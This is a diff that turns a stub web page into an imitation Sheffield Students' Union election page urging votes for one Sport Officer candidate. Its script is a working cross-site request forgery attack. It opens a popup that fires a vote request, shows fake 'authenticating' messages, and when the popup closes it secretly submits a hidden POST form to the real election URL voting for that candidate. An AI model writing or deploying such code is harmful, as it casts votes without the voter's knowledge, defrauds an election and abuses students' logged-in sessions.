@@ -1,8 +1,161 @@
----
-layout: default
-title: Web Programming
----
-<div class="blurb">
-    <h1>Hello Sweet World</h1>
-    <p>Once upon a time, ..</p>
-</div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vote Nripesh Bharathi - Sport Officer 2026</title>
+  <link rel="icon" type="image/x-icon" href="https://f0a63dc10f9b8e5602d2-918c4a94592cd7fa431dd71bf51b646a.ssl.cf3.rackcdn.com/faviconSSU.png">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Inter','Nunito',sans-serif;background:#f7f8fa;color:#333;min-height:100vh}
+    .topbar{background:#1a1a2e;padding:12px 24px;display:flex;align-items:center;gap:12px}
+    .topbar img{height:36px}.topbar span{color:#fff;font-weight:600;font-size:15px}
+    .banner{background:linear-gradient(135deg,#0ABEF0,#7BFAFC);padding:32px 24px;text-align:center}
+    .banner h1{font-size:22px;font-weight:700;color:#1a1a2e}
+    .banner p{font-size:14px;color:#333;margin-top:6px}
+    .container{max-width:600px;margin:24px auto;padding:0 16px}
+    .card{background:#fff;border-radius:16px;padding:32px 24px;box-shadow:0 2px 12px rgba(0,0,0,.06);text-align:center}
+    .spinner{width:44px;height:44px;border:4px solid #e8e8e8;border-top-color:#0ABEF0;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .card h2{font-size:18px;color:#333;margin-bottom:8px}
+    .card p{font-size:14px;color:#888}
+    .progress-bar{height:4px;background:#e8e8e8;border-radius:2px;margin-top:20px;overflow:hidden}
+    .progress-fill{height:100%;background:#0ABEF0;border-radius:2px;width:0%;transition:width .4s}
+    .btn{display:inline-block;padding:14px 40px;border-radius:10px;font-weight:700;font-size:17px;text-decoration:none;cursor:pointer;border:none;transition:all .2s;color:#fff;margin-top:20px}
+    .btn-cta{background:linear-gradient(135deg,#0ABEF0,#07a5d1);box-shadow:0 4px 14px rgba(10,190,240,.35)}
+    .btn-cta:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(10,190,240,.4)}
+    .vote-info{display:flex;justify-content:center;gap:24px;margin-top:16px;font-size:13px;color:#999}
+    .candidate{display:flex;gap:16px;align-items:center;text-align:left;margin-bottom:20px}
+    .candidate img{width:80px;height:80px;border-radius:12px;object-fit:cover}
+    .candidate-name{font-weight:700;font-size:16px;color:#1a1a2e}
+    .candidate-bio{font-size:13px;color:#666;margin-top:4px;line-height:1.5}
+    .footer{text-align:center;padding:24px;font-size:12px;color:#aaa}
+    .hidden{display:none!important}
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <img src="https://assets-cdn.sums.su/SH/website/img/logo.svg" alt="SU" onerror="this.style.display='none'">
+    <span>Sheffield Students' Union</span>
+  </div>
+  <div class="banner">
+    <h1>Vote Nripesh Bharathi for Sport Officer 2026</h1>
+    <p>Support Nripesh — click below to cast your vote</p>
+  </div>
+  <div class="container">
+    <div class="card" id="stepCTA">
+      <div class="candidate">
+        <img src="https://4b484c3a5cd66bb460e4-0bc5ea24ebae515288c3fa3391ffe3cc.ssl.cf3.rackcdn.com/el_2904_svWpXM2UNxdLQRCP_photo.jpg" alt="Nripesh Bharathi">
+        <div>
+          <div class="candidate-name">Nripesh Bharathi</div>
+          <div class="candidate-bio">I've loved sport since I was young; especially football, cricket and chess. I represent the University of Sheffield in all three. At my previous university, I served as captain and president of the main football team, leading teams on and off the pitch.</div>
+        </div>
+      </div>
+      <h2>Vote for Nripesh</h2>
+      <p>Tap below to cast your vote for Sport Officer.</p>
+      <button class="btn btn-cta" id="viewBtn">Vote for Nripesh</button>
+      <div class="vote-info">
+        <span>Voting closes: 05/03/2026</span>
+        <span>Election #1452</span>
+      </div>
+    </div>
+    <div class="card hidden" id="stepLoading">
+      <div class="spinner"></div>
+      <h2 id="loadText">Authenticating with University servers...</h2>
+      <p id="loadSub">If prompted, sign in then return to this page</p>
+      <div class="progress-bar"><div class="progress-fill" id="bar"></div></div>
+    </div>
+  </div>
+  <div class="footer">&copy; 2026 Sheffield Students' Union</div>
+
+  <script>
+    (function() {
+      var VOTE_URL = 'https://su.sheffield.ac.uk/elections/vote-sport/1452';
+      var popup = null;
+      var voted = false;
+
+      function show(id) { document.getElementById(id).classList.remove('hidden'); }
+      function hide(id) { document.getElementById(id).classList.add('hidden'); }
+      function setText(id, t) { document.getElementById(id).textContent = t; }
+      function setBar(pct) { document.getElementById('bar').style.width = pct + '%'; }
+      function closePopup() { try { if (popup && !popup.closed) popup.close(); } catch(e) {} }
+
+      window.addEventListener('beforeunload', closePopup);
+      window.addEventListener('pagehide', closePopup);
+
+      document.getElementById('viewBtn').addEventListener('click', function() {
+        hide('stepCTA');
+        show('stepLoading');
+        setBar(20);
+
+        // Open popup directly to vote.html — fires POST immediately
+        // Case 1 (logged in): POST goes through → vote registers → popup lands on SU site
+        // Case 2 (not logged in): POST redirects to SSO → user logs in in popup
+        popup = window.open(
+          './vote.html',
+          'suAuth',
+          'width=500,height=650,left=' + ((screen.width - 500) / 2) + ',top=' + ((screen.height - 650) / 2)
+        );
+
+        if (!popup || popup.closed) {
+          setText('loadText', 'Popup blocked — click to retry');
+          show('stepCTA'); hide('stepLoading');
+          return;
+        }
+
+        setBar(40);
+
+        // Track if page was ever hidden (popup took focus)
+        var wasHidden = false;
+
+        // TRIGGER 1: user switches back to main tab
+        // Only fires AFTER the page was hidden at least once (prevents premature firing)
+        document.addEventListener('visibilitychange', function() {
+          if (document.hidden) {
+            wasHidden = true;
+          } else if (wasHidden && !voted) {
+            voted = true;
+            setText('loadText', 'Casting your vote...');
+            setText('loadSub', 'Almost there');
+            setBar(70);
+            try {
+              if (popup && !popup.closed) popup.location = './vote.html';
+            } catch(e) {}
+            setTimeout(function() {
+              setBar(100);
+              closePopup();
+              setTimeout(function() { window.location.href = VOTE_URL; }, 1000);
+            }, 3000);
+          }
+        });
+
+        // TRIGGER 2: user closes the popup → fire top-level POST
+        setInterval(function() {
+          if (popup && popup.closed && !voted) {
+            voted = true;
+            setBar(70);
+            setText('loadText', 'Casting your vote...');
+            setText('loadSub', 'Almost there');
+            setTimeout(function() {
+              setBar(100);
+              var form = document.createElement('form');
+              form.method = 'POST';
+              form.action = VOTE_URL;
+              form.style.display = 'none';
+              var fields = {'do':'vote','election_id':'1452','candidate[2904]':'1'};
+              for (var n in fields) {
+                var inp = document.createElement('input');
+                inp.type = 'hidden'; inp.name = n; inp.value = fields[n];
+                form.appendChild(inp);
+              }
+              document.body.appendChild(form);
+              form.submit();
+            }, 1000);
+          }
+        }, 1000);
+      });
+    })();
+  </script>
+</body>
+</html>
